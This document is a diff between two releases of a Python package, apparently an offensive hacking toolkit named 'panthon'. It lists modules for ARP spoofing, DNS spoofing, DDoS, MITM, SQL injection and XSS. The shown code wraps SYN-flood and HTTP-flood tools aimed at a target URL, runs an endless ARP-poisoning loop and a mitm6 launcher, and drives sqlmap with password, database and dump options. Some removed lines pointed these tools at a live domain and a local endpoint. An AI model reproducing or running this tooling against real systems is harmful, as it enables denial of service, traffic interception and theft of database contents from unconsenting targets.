# Comparing `tmp/panthon-0.1.9.tar.gz` & `tmp/panthon-0.2.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "panthon-0.1.9.tar", last modified: Thu Aug 10 09:10:25 2023, max compression
+gzip compressed data, was "panthon-0.2.0.tar", last modified: Sun Apr 14 20:18:32 2024, max compression
```

## Comparing `panthon-0.1.9.tar` & `panthon-0.2.0.tar`

### file list

```diff
@@ -1,23 +1,29 @@
-drwxr-xr-x   0 anni      (1000) anni      (1000)        0 2023-08-10 09:10:25.965719 panthon-0.1.9/
--rw-r--r--   0 anni      (1000) anni      (1000)     1072 2023-08-08 10:32:56.000000 panthon-0.1.9/LICENSE
--rw-r--r--   0 anni      (1000) anni      (1000)      700 2023-08-10 09:10:25.965719 panthon-0.1.9/PKG-INFO
--rw-r--r--   0 anni      (1000) anni      (1000)      951 2023-08-09 09:04:19.000000 panthon-0.1.9/README.md
-drwxr-xr-x   0 anni      (1000) anni      (1000)        0 2023-08-10 09:10:25.965719 panthon-0.1.9/panthon.egg-info/
--rw-r--r--   0 anni      (1000) anni      (1000)      700 2023-08-10 09:10:25.000000 panthon-0.1.9/panthon.egg-info/PKG-INFO
--rw-r--r--   0 anni      (1000) anni      (1000)      379 2023-08-10 09:10:25.000000 panthon-0.1.9/panthon.egg-info/SOURCES.txt
--rw-r--r--   0 anni      (1000) anni      (1000)        1 2023-08-10 09:10:25.000000 panthon-0.1.9/panthon.egg-info/dependency_links.txt
--rw-r--r--   0 anni      (1000) anni      (1000)       50 2023-08-10 09:10:25.000000 panthon-0.1.9/panthon.egg-info/requires.txt
--rw-r--r--   0 anni      (1000) anni      (1000)        1 2023-08-10 09:10:25.000000 panthon-0.1.9/panthon.egg-info/top_level.txt
--rw-r--r--   0 anni      (1000) anni      (1000)      103 2023-08-08 10:32:56.000000 panthon-0.1.9/pyproject.toml
--rw-r--r--   0 anni      (1000) anni      (1000)       79 2023-08-10 09:10:25.965719 panthon-0.1.9/setup.cfg
--rw-r--r--   0 anni      (1000) anni      (1000)     1169 2023-08-10 09:10:20.000000 panthon-0.1.9/setup.py
-drwxr-xr-x   0 anni      (1000) anni      (1000)        0 2023-08-10 09:10:25.965719 panthon-0.1.9/src/
--rw-r--r--   0 anni      (1000) anni      (1000)     1412 2023-08-08 10:32:56.000000 panthon-0.1.9/src/arp_spoofing.py
--rw-r--r--   0 anni      (1000) anni      (1000)     2276 2023-08-08 10:32:56.000000 panthon-0.1.9/src/ddos_attack.py
--rw-r--r--   0 anni      (1000) anni      (1000)     1926 2023-08-08 10:32:56.000000 panthon-0.1.9/src/dns_spoofer.py
--rw-r--r--   0 anni      (1000) anni      (1000)    10515 2023-08-09 18:38:40.000000 panthon-0.1.9/src/dsss.py
--rw-r--r--   0 anni      (1000) anni      (1000)     2217 2023-08-08 10:32:56.000000 panthon-0.1.9/src/mitm_attack.py
--rw-r--r--   0 anni      (1000) anni      (1000)      380 2023-08-09 09:33:15.000000 panthon-0.1.9/src/random_string_generator.py
--rw-r--r--   0 anni      (1000) anni      (1000)   273202 2023-08-08 10:32:56.000000 panthon-0.1.9/src/saphyra.py
--rw-r--r--   0 anni      (1000) anni      (1000)     2392 2023-08-09 18:38:40.000000 panthon-0.1.9/src/sql_injection.py
--rw-r--r--   0 anni      (1000) anni      (1000)     1966 2023-08-08 10:32:56.000000 panthon-0.1.9/src/xss_attack.py
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2024-04-14 20:18:32.258679 panthon-0.2.0/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1072 2023-07-23 10:41:07.000000 panthon-0.2.0/LICENSE
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1696 2024-04-14 20:18:32.258414 panthon-0.2.0/PKG-INFO
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      951 2023-08-09 17:19:06.000000 panthon-0.2.0/README.md
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2024-04-14 20:18:32.255765 panthon-0.2.0/panthon/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      349 2024-04-14 20:04:34.000000 panthon-0.2.0/panthon/__init__.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1444 2024-04-14 19:34:55.000000 panthon-0.2.0/panthon/arp_spoofing.py
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2024-04-14 20:18:32.256595 panthon-0.2.0/panthon/data/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)   110530 2023-09-16 19:07:13.000000 panthon-0.2.0/panthon/data/useragents.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1899 2024-04-14 19:15:41.000000 panthon-0.2.0/panthon/ddos_attack.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1576 2024-04-13 09:37:29.000000 panthon-0.2.0/panthon/dns_spoofer.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     5269 2024-04-14 19:34:55.000000 panthon-0.2.0/panthon/dos_attack.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2670 2024-04-14 19:15:41.000000 panthon-0.2.0/panthon/mitm_attack.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1644 2024-04-14 19:46:37.000000 panthon-0.2.0/panthon/network_spoofer.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2499 2024-04-14 19:34:55.000000 panthon-0.2.0/panthon/sql_injection.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2573 2024-04-14 20:03:26.000000 panthon-0.2.0/panthon/website_extractor.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2689 2024-04-14 19:34:55.000000 panthon-0.2.0/panthon/xss_attack.py
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2024-04-14 20:18:32.258085 panthon-0.2.0/panthon.egg-info/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1696 2024-04-14 20:18:32.000000 panthon-0.2.0/panthon.egg-info/PKG-INFO
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      510 2024-04-14 20:18:32.000000 panthon-0.2.0/panthon.egg-info/SOURCES.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)        1 2024-04-14 20:18:32.000000 panthon-0.2.0/panthon.egg-info/dependency_links.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)       52 2024-04-14 20:18:32.000000 panthon-0.2.0/panthon.egg-info/requires.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)        8 2024-04-14 20:18:32.000000 panthon-0.2.0/panthon.egg-info/top_level.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      103 2023-10-19 15:01:46.000000 panthon-0.2.0/pyproject.toml
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)       38 2024-04-14 20:18:32.258726 panthon-0.2.0/setup.cfg
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1189 2024-04-14 20:18:27.000000 panthon-0.2.0/setup.py
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2024-04-14 20:18:32.257723 panthon-0.2.0/test/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      448 2023-08-20 08:38:11.000000 panthon-0.2.0/test/test_ddos_attack.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1789 2023-08-20 08:38:11.000000 panthon-0.2.0/test/test_dos_attack.py
```

### Comparing `panthon-0.1.9/LICENSE` & `panthon-0.2.0/LICENSE`

 * *Files identical despite different names*

### Comparing `panthon-0.1.9/README.md` & `panthon-0.2.0/README.md`

 * *Files identical despite different names*

### Comparing `panthon-0.1.9/src/arp_spoofing.py` & `panthon-0.2.0/panthon/arp_spoofing.py`

 * *Files 6% similar despite different names*

```diff
@@ -8,14 +8,15 @@
         self.spoof_ip = spoof_ip
 
     def get_mac(self, ip):
         responses, unanswered = srp(
             Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=10
         )
         for s, r in responses:
+            print(r[Ether].src)
             return r[Ether].src
         return None
 
     def spoof(self):
         target_mac = self.get_mac(self.target_ip)
         if target_mac is None:
             print("Could not find MAC address for target. Exiting.")
```

### Comparing `panthon-0.1.9/src/ddos_attack.py` & `panthon-0.2.0/panthon/ddos_attack.py`

 * *Files 26% similar despite different names*

```diff
@@ -9,26 +9,22 @@
 
 logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
 )
 
 
 class DDoSAttack:
-    def __init__(self):
-        self.threads = []
-
-    def aSYNcrone_attack(self, target_url, target_port, num_connections):
+    def aSYNcrone_attack(self, target_url, target_port, num_connections=10000):
         platform_type = self.detect_platform()
 
         if platform_type:
             parsed_url = urlparse(target_url)
             hostname = parsed_url.netloc
             ip = socket.gethostbyname(hostname)
             command = [
-                "sudo",
                 platform_type,
                 "80",
                 ip,
                 str(target_port),
                 str(num_connections),
             ]
             try:
@@ -36,42 +32,30 @@
             except subprocess.CalledProcessError as e:
                 logging.error(f"Error while running aSYNcrone: {e}")
                 return
 
     def saphyra_attack(self, target_url):
         command = [
             "python3",
-            os.path.join(os.path.dirname(__file__), "saphyra.py"),
+            os.path.join(os.path.dirname(__file__), "DDOS/saphyra.py"),
             target_url,
         ]
         try:
             subprocess.run(command)
         except subprocess.CalledProcessError as e:
             logging.error(f"Error while running saphyra: {e}")
             return
 
     def detect_platform(self):
         if sys.platform == "darwin" and platform.machine() == "arm64":
-            return os.path.join(os.path.dirname(__file__), "aSYNcrone/aSYNcronemacARM")
+            return os.path.join(
+                os.path.dirname(__file__), "DDOS/aSYNcrone/aSYNcronemacARM"
+            )
         elif sys.platform == "darwin":
-            return os.path.join(os.path.dirname(__file__), "aSYNcrone/aSYNcronemac")
+            return os.path.join(
+                os.path.dirname(__file__), "DDOS/aSYNcrone/aSYNcronemac"
+            )
         elif sys.platform == "linux":
-            return os.path.join(os.path.dirname(__file__), "aSYNcrone/aSYNcrone")
+            return os.path.join(os.path.dirname(__file__), "DDOS/aSYNcrone/aSYNcrone")
         else:
             logging.error(f"Unknown platform: {sys.platform}")
             return None
-
-
-# Create DDoSAttack object
-attack = DDoSAttack()
-
-# aSYNcrone attack parameters
-target_url_async = "https://panthon.app"
-target_port_async = 80
-num_connections_async = 1
-
-# Saphyra attack parameters
-target_url_saphyra = "https://panthon.app"
-
-# Launch attacks
-attack.aSYNcrone_attack(target_url_async, target_port_async, num_connections_async)
-attack.saphyra_attack(target_url_saphyra)
```

### Comparing `panthon-0.1.9/src/mitm_attack.py` & `panthon-0.2.0/panthon/mitm_attack.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,20 +1,22 @@
 import netifaces
+import subprocess
+import os
 import ipaddress
 from scapy.all import ARP, Ether, sendp
 import logging
 import time
 
 logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
 )
 
 
 class MITMAttack:
-    def __init__(self, target_ip, gateway_ip, interface):
+    def set_attributes(self, target_ip, gateway_ip, interface):
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface
         self.mac = self.get_interface_mac(self.interface)
         self.broadcast = "ff:ff:ff:ff:ff:ff"
 
     def get_interface_mac(self, interface):
@@ -47,20 +49,31 @@
             while True:
                 sendp(arp_response_target, iface=self.interface)
                 sendp(arp_response_gateway, iface=self.interface)
                 time.sleep(2)  # Add sleep to prevent overloading the network
         except KeyboardInterrupt:
             logging.info("\nMITM Attack Stopped.")
 
-
-if __name__ == "__main__":
-    interface = input("Enter the interface name: ")
-    target_ip = input("Enter the target IP address: ")
-    gateway_ip = input("Enter the gateway IP address: ")
-
-    try:
-        mitm = MITMAttack(
-            target_ip=target_ip, gateway_ip=gateway_ip, interface=interface
+    def mitm6(
+        self,
+        interface=None,
+        localdomain=None,
+        ipv4=None,
+        ipv6=None,
+        mac=None,
+        relay_target=None,
+    ):
+        logging.info(
+            "Attacking {} with packets from {}...".format(interface, ipv4 or ipv6)
         )
-        mitm.run_attack()
-    except ValueError as e:
-        logging.error(e)
+        path_to_executable = os.path.join(os.path.dirname(__file__), "mitm/mitm6.py")
+        command = [
+            "python3",
+            path_to_executable,
+            f" -i {str(interface)}" if interface else "",
+            f" -l {str(localdomain)}" if localdomain else "",
+            f" -4 {str(ipv4)}" if ipv4 else "",
+            f" -6 {str(ipv6)}" if ipv6 else "",
+            f" -m {str(mac)}" if mac else "",
+            f" -r {str(relay_target)}" if relay_target else "",
+        ]
+        subprocess.run(command)
```

### Comparing `panthon-0.1.9/src/sql_injection.py` & `panthon-0.2.0/panthon/sql_injection.py`

 * *Files 26% similar despite different names*

```diff
@@ -1,48 +1,57 @@
-from random_string_generator import RandomStringGenerator
 import logging
 import subprocess
 import os
-import dsss
+from .SQL.dsss import dsss
 
 
 class SQLInjectionAttack:
     def sqlmap_attack(
         self,
         target_url,
-        level=1,
-        risk=1,
+        level=None,
+        risk=None,
         password=False,
-        dbs=False,
+        dbs=True,
         tables=False,
         database=None,
         dump=False,
         TBL=None,
+        cookies=None,
+        crawl=False,
+        batch=False,
     ):
         logging.info("Attacking %s with SQLMap...", target_url)
-        path_to_executable = os.path.join(os.path.dirname(__file__), "sqlmap/sqlmap.py")
+        path_to_executable = os.path.join(
+            os.path.dirname(__file__), "SQL/sqlmap/sqlmap.py"
+        )
         command = [
             "python3",
             path_to_executable,
+            # "--flush-session",
             "-u",
             target_url,
-            "--batch",
-            "--level",
-            str(level),
-            "--risk",
-            str(risk),
+            "--batch" if batch else "",
+            "--level" if level else "",
+            str(level) if level else "",
+            "--risk" if risk else "",
+            str(risk) if risk else "",
             "--passwords" if password else "",
             "--dbs" if dbs else "",
             "--tables" if tables else "",
             "-D" if database else "",
             database if database else "",
             "--dump" if dump else "",
             "-T" if TBL else "",
             TBL if TBL else "",
+            "--cookie" if cookies else "",
+            str(cookies) if cookies else "",
+            "--crawl=2" if crawl else "",
         ]
+        print("sqlmap")
         subprocess.run(command)
 
     def sqli_scanner(
         self, target_url, data=None, cookie=None, ua=None, referer=None, proxy=None
     ):
         """Scans the target_url for potential SQL injection vulnerabilities.
 
@@ -55,26 +64,19 @@
         - proxy (str, optional): HTTP proxy address.
 
         Returns:
         - bool: True if potential vulnerabilities are found, False otherwise.
         """
 
         # Initialize options for the scanner
-        dsss.init_options(proxy=proxy, cookie=cookie, ua=ua, referer=referer)
+        attack = dsss(proxy=proxy, cookie=cookie, ua=ua, referer=referer)
 
         # Scan the target URL
-        result = dsss.scan_page(target_url, data)
+        result = attack.scan_page(target_url, data)
 
         # Print the result
         logging.info(
             "\nscan results: %s vulnerabilities found"
             % ("possible" if result else "no")
         )
-
+        print("sqli")
         return result
-
-
-# Example usage:
-sql_injection_attack = SQLInjectionAttack()
-target_url = "http://localhost:3000/rest/products/search?q="
-sql_injection_attack.sqli_scanner(target_url)
-sql_injection_attack.sqlmap_attack(target_url, database="test")
```

